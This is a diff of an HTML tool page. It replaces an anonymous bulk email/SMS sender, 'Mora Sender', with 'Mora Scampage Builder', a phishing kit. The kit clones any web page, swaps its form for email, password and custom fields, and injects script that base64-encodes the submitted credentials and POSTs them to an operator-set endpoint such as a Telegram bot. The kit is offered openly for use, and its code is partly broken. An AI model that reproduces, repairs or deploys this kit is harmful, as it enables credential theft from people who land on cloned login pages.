@@ -1,348 +1,253 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Mora Sender</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
-      font-family: Arial, sans-serif;
-      line-height: 1.6;
-      background: #f4f4f4;
-      color: #333;
-    }
-
-    header {
-      background: #4caf50;
-      color: #fff;
-      padding: 1.5rem 1rem;
-      text-align: center;
-    }
-
-    header h1 {
-      font-size: 2.5rem;
-    }
-
-    header p {
-      font-size: 1.2rem;
-    }
-
-    main {
-      padding: 2rem;
-    }
-
-    #dashboard {
-      background: #fff;
-      padding: 2rem;
-      margin: auto;
-      max-width: 800px;
-      border-radius: 8px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-    }
-
-    .status {
-      font-size: 1.2rem;
-      margin-bottom: 1.5rem;
-      padding: 1rem;
-      background: #e8f5e9;
-      border: 1px solid #c8e6c9;
-      border-radius: 4px;
-    }
-
-    .input-group {
-      margin-bottom: 1.5rem;
-    }
-
-    label {
-      display: block;
-      font-weight: bold;
-      margin-bottom: 0.5rem;
-    }
-
-    input,
-    textarea,
-    button,
-    select {
-      width: 100%;
-      padding: 0.8rem;
-      margin-top: 0.5rem;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-      font-size: 1rem;
-    }
-
-    textarea {
-      resize: none;
-    }
-
-    button.primary-button {
-      background: #4caf50;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
-      border: none;
-    }
-
-    button.primary-button:hover {
-      background: #45a049;
-    }
-
-    footer {
-      text-align: center;
-      margin-top: 2rem;
-      padding: 1rem;
-      background: #333;
-      color: #fff;
-    }
-
-    footer a {
-      color: #4caf50;
-      text-decoration: none;
-    }
-
-    footer a:hover {
-      text-decoration: underline;
-    }
-
-    .message-format-options {
-      display: flex;
-      justify-content: space-between;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mora Scampage Builder</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 600px;
+            margin: auto;
+            background: #fff;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 5px;
+        }
+        .section {
+            margin-bottom: 20px;
+        }
+        input, button, textarea {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #6200ea;
+            color: white;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #3700b3;
+        }
+        .output {
+            background: #1e1e1e;
+            color: #39ff14;
+            font-family: monospace;
+            padding: 15px;
+            border-radius: 5px;
+            height: 200px;
+            overflow-y: auto;
+        }
+        #progress-bar {
+            background: #ccc;
+            width: 100%;
+            height: 20px;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+        #progress {
+            width: 0%;
+            height: 100%;
+            background: #6200ea;
+            border-radius: 5px;
+        }
+    </style>
 </head>
 <body>
-  <header>
-    <h1>Mora Sender</h1>
-    <p>The ultimate solution to anonymous mailing and texting</p>
-  </header>
-  <main>
-    <section id="dashboard">
-      <div id="statusDiv" class="status">
-        Emails: 0, Phones: 0
-      </div>
+    <div class="container">
+        <h1>Mora Scampage Builder</h1>
 
-      <!-- Select Mode -->
-      <div class="input-group">
-        <label for="sendMode">Choose Mode:</label>
-        <select id="sendMode">
-          <option value="email">Email</option>
-          <option value="sms">SMS</option>
-        </select>
-      </div>
-
-      <!-- API or SMTP Selection -->
-      <div class="input-group">
-        <label for="connectionMode">Select Connection Type:</label>
-        <select id="connectionMode">
-          <option value="api">API</option>
-          <option value="smtp">SMTP</option>
-        </select>
-      </div>
-
-      <!-- File Upload -->
-      <div class="input-group">
-        <label for="fileInput">Upload Contact List:</label>
-        <input type="file" id="fileInput" accept=".txt">
-      </div>
-
-      <!-- Message Input -->
-      <div class="input-group">
-        <label for="messageBox">Message:</label>
-        <textarea id="messageBox" placeholder="Enter your message here..."></textarea>
-      </div>
-
-      <!-- Message Format Selection -->
-      <div class="message-format-options">
-        <div>
-          <label for="messageType">Message Format:</label>
-          <select id="messageType">
-            <option value="text">Text</option>
-            <option value="html">HTML</option>
-          </select>
+        <!-- Step 1: Clone Page -->
+        <div class="section">
+            <label for="url">Step 1: Enter the URL to clone:</label>
+            <input type="text" id="url" placeholder="https://example.com">
+            <button onclick="clonePage()">Clone Page</button>
         </div>
-      </div>
 
-      <!-- Attachment Upload -->
-      <div class="input-group">
-        <label for="attachmentInput">Attach File (Optional):</label>
-        <input type="file" id="attachmentInput">
-      </div>
+        <!-- Step 2: What to do with the cloned page -->
+        <div class="section">
+            <label>Step 2: What would you like to do?</label>
+            <button onclick="downloadClonedPage()">Download Cloned Page</button>
+            <button onclick="convertToPhishing()">Convert to Phishing Page</button>
+        </div>
 
-      <!-- Schedule Input -->
-      <div class="input-group">
-        <label for="scheduleInput">Schedule:</label>
-        <input type="datetime-local" id="scheduleInput">
-      </div>
+        <!-- Step 3: Customize Phishing Form -->
+        <div class="section">
+            <label>Step 3: Customize Phishing Form Fields</label>
+            <button onclick="addInputField()">Add Input Field</button>
+            <div id="input-fields-container"></div>
+        </div>
 
-      <!-- API Key -->
-      <div class="input-group">
-        <label for="apiKeyInput">API Key:</label>
-        <input type="text" id="apiKeyInput" placeholder="Enter API Key">
-      </div>
+        <!-- Step 4: Configure Results Delivery -->
+        <div class="section">
+            <label>Step 4: Set up where to send results:</label>
+            <textarea id="results-config" placeholder="Enter email or Telegram bot API endpoint..."></textarea>
+        </div>
 
-      <!-- SMTP Configuration -->
-      <form id="smtpConfigForm">
-        <h3>SMTP Configuration:</h3>
-        <input type="text" name="smtpHost" placeholder="SMTP Host">
-        <input type="number" name="smtpPort" placeholder="SMTP Port">
-        <input type="text" name="smtpUser" placeholder="SMTP Username">
-        <input type="password" name="smtpPass" placeholder="SMTP Password">
-        <button type="submit">Configure SMTP</button>
-      </form>
+        <!-- Step 5: Download or Preview -->
+        <div class="section">
+            <label>Step 5: Finalize:</label>
+            <button onclick="previewPhishingPage()">Preview Phishing Page</button>
+            <button onclick="downloadPhishingPage()">Download Phishing Page</button>
+        </div>
 
-      <!-- Send Button -->
-      <button id="sendButton" class="primary-button">Send</button>
-    </section>
-  </main>
+        <!-- Progress Indicator -->
+        <div class="section">
+            <label>Progress:</label>
+            <div id="progress-bar">
+                <div id="progress"></div>
+            </div>
+        </div>
 
-  <footer>
-    <p>Built by Lordship | <a href="https://t.me/lordshipempire" target="_blank">Telegram: t.me/lordshipempire</a></p>
-  </footer>
-  
-  <script>
-    document.addEventListener("DOMContentLoaded", () => {
-      const sendButton = document.getElementById("sendButton");
-      const fileInput = document.getElementById("fileInput");
-      const statusDiv = document.getElementById("statusDiv");
-      const scheduleInput = document.getElementById("scheduleInput");
-      const apiKeyInput = document.getElementById("apiKeyInput");
-      const smtpConfigForm = document.getElementById("smtpConfigForm");
-      const messageBox = document.getElementById("messageBox");
-      const attachmentInput = document.getElementById("attachmentInput");
-      const sendModeSelect = document.getElementById("sendMode");
-      const connectionModeSelect = document.getElementById("connectionMode");
-      const messageTypeSelect = document.getElementById("messageType");
+        <!-- Output Section -->
+        <div class="section">
+            <label>Output:</label>
+            <div class="output" id="output"></div>
+        </div>
+    </div>
 
-      let emailList = [];
-      let phoneList = [];
-      let apiConfigured = false;
-      let smtpConfigured = false;
+    <script>
+        let clonedHtml = "";
+        let phishingHtml = "";
 
-      // File Upload
-      fileInput.addEventListener("change", (e) => {
-        const file = e.target.files[0];
-        if (file) {
-          const reader = new FileReader();
-          reader.onload = (event) => {
-            const content = event.target.result;
-            processFile(content);
-          };
-          reader.readAsText(file);
-        }
-      });
-
-      function processFile(content) {
-        const lines = content.split("\n").filter(Boolean);
-        lines.forEach((line) => {
-          if (validateEmail(line)) emailList.push(line);
-          else if (validatePhone(line)) phoneList.push(line);
-        });
-        updateStatus();
-      }
-
-      function validateEmail(email) {
-        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        return regex.test(email);
-      }
-
-      function validatePhone(phone) {
-        const regex = /^\+?[1-9]\d{1,14}$/;
-        return regex.test(phone);
-      }
-
-      function updateStatus() {
-        statusDiv.textContent = `Emails: ${emailList.length}, Phones: ${phoneList.length}`;
-      }
-
-      // SMTP Configuration
-      smtpConfigForm.addEventListener("submit", (e) => {
-        e.preventDefault();
-        const smtpHost = e.target.smtpHost.value;
-        const smtpPort = e.target.smtpPort.value;
-        const smtpUser = e.target.smtpUser.value;
-        const smtpPass = e.target.smtpPass.value;
-
-        if (smtpHost && smtpPort && smtpUser && smtpPass) {
-          smtpConfigured = true;
-          alert("SMTP Configured Successfully");
-        } else {
-          smtpConfigured = false;
-          alert("Invalid SMTP Configuration");
-        }
-      });
-
-      // Sending Logic
-      sendButton.addEventListener("click", () => {
-        const message = messageBox.value;
-        const attachment = attachmentInput.files[0];
-        const schedule = scheduleInput.value;
-        const sendMode = sendModeSelect.value;
-        const connectionMode = connectionModeSelect.value;
-        const messageType = messageTypeSelect.value;
-
-        if (!message) {
-          alert("Message cannot be empty!");
-          return;
+        // Function to clone a webpage
+        async function clonePage() {
+            const url = document.getElementById("url").value.trim();
+            if (!url) {
+                appendToOutput("Error: Please enter a valid URL.");
+                return;
+            }
+            try {
+                appendToOutput(`Cloning page from: ${url}...`);
+                updateProgress(25);
+                const response = await fetch(url);
+                clonedHtml = await response.text();
+                appendToOutput("Page cloned successfully. You can now download it or convert it to a phishing page.");
+                updateProgress(50);
+            } catch (error) {
+                appendToOutput(`Error cloning the page: ${error.message}`);
+            }
         }
 
-        if (!apiConfigured && !smtpConfigured) {
-          alert("Configure either API or SMTP before sending!");
-          return;
+        // Function to download the cloned page
+        function downloadClonedPage() {
+            if (!clonedHtml) {
+                appendToOutput("Error: No cloned page available. Please clone a page first.");
+                return;
+            }
+            const blob = new Blob([clonedHtml], { type: "text/html" });
+            const link = document.createElement("a");
+            link.href = URL.createObjectURL(blob);
+            link.download = "cloned_page.html";
+            link.click();
+            appendToOutput("Cloned page downloaded successfully.");
         }
 
-        if (sendMode === "email" && emailList.length === 0) {
-          alert("No email recipients found!");
-          return;
+        // Function to add custom input fields
+        function addInputField() {
+            const container = document.getElementById("input-fields-container");
+            const input = document.createElement("input");
+            input.type = "text";
+            input.placeholder = "Field Name (e.g., Username)";
+            container.appendChild(input);
         }
 
-        if (sendMode === "sms" && phoneList.length === 0) {
-          alert("No phone recipients found!");
-          return;
+        // Function to convert the cloned page into a phishing page
+        function convertToPhishing() {
+            if (!clonedHtml) {
+                appendToOutput("Error: No cloned page available. Please clone a page first.");
+                return;
+            }
+
+            // Collect custom input fields
+            const fieldsContainer = document.getElementById("input-fields-container");
+            const customFields = Array.from(fieldsContainer.children)
+                .map(input => `<input type="text" name="${input.value}" placeholder="${input.value}" required />`)
+                .join("");
+
+            phishingHtml = clonedHtml.replace(
+                /<form[^>]*>([\s\S]*?)<\/form>/i,
+                `
+                <form id="phishing-form">
+                    ${customFields}
+                    <input type="email" name="email" placeholder="Email" required />
+                    <input type="password" name="password" placeholder="Password" required />
+                    <button type="submit">Submit</button>
+                </form>
+                <script>
+                    document.getElementById('phishing-form').addEventListener('submit', function(e) {
+                        e.preventDefault();
+                        const data = new FormData(e.target);
+                        sendCredentials(Object.fromEntries(data));
+                    });
+                    function sendCredentials(data) {
+                        const config = document.getElementById('results-config').value.trim();
+                        const encryptedData = btoa(JSON.stringify(data)); // Basic encryption
+                        if (config.startsWith('http')) {
+                            fetch(config, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ encryptedData })
+                            }).then(() => alert('Credentials sent!'));
+                        } else {
+                            alert('Invalid configuration. Please enter a valid email or Telegram ID.');
+                        }
+                    }
+                </script>
+                `
+            );
+            appendToOutput("Page converted to a phishing page. You can now download it.");
+            updateProgress(75);
         }
 
-        simulateSending(sendMode, connectionMode, message, attachment, schedule, messageType);
-      });
-
-      function simulateSending(sendMode, connectionMode, message, attachment, schedule, messageType) {
-        let sent = 0;
-        let failed = 0;
-
-        if (sendMode === "email") {
-          emailList.forEach((email) => {
-            const success = Math.random() > 0.1;
-            if (success) sent++;
-            else failed++;
-          });
-        } else if (sendMode === "sms") {
-          phoneList.forEach((phone) => {
-            const success = Math.random() > 0.1;
-            if (success) sent++;
-            else failed++;
-          });
+        // Function to preview the phishing page
+        function previewPhishingPage() {
+            if (!phishingHtml) {
+                appendToOutput("Error: No phishing page available. Please convert a page first.");
+                return;
+            }
+            const blob = new Blob([phishingHtml], { type: "text/html" });
+            const url = URL.createObjectURL(blob);
+            window.open(url, "_blank");
         }
 
-        alert(
-          `${sendMode === "email" ? "Emails" : "SMS"} Sent: ${sent}, Failed: ${failed}. Scheduled for: ${
-            schedule || "Now"
-          }.`
-        );
-      }
-
-      apiKeyInput.addEventListener("input", (e) => {
-        const key = e.target.value.trim();
-        if (key) {
-          apiConfigured = true;
-        } else {
-          apiConfigured = false;
+        // Function to download the phishing page
+        function downloadPhishingPage() {
+            if (!phishingHtml) {
+                appendToOutput("Error: No phishing page available. Please convert a page first.");
+                return;
+            }
+            const blob = new Blob([phishingHtml], { type: "text/html" });
+            const link = document.createElement("a");
+            link.href = URL.createObjectURL(blob);
+            link.download = "phishing_page.html";
+            link.click();
+            appendToOutput("Phishing page downloaded successfully.");
+            updateProgress(100);
         }
-      });
-    });
-  </script>
+
+        // Function to append messages to the output
+        function appendToOutput(message) {
+            const output = document.getElementById("output");
+            const messageNode = document.createElement("p");
+            messageNode.textContent = message;
+            output.appendChild(messageNode);
+            output.scrollTop = output.scrollHeight; // Auto-scroll
+        }
+
+        // Function to update progress bar
+        function updateProgress(percentage) {
+            const progress = document.getElementById("progress");
+            progress.style.width = `${percentage}%`;
+        }
+    </script>
 </body>
 </html>
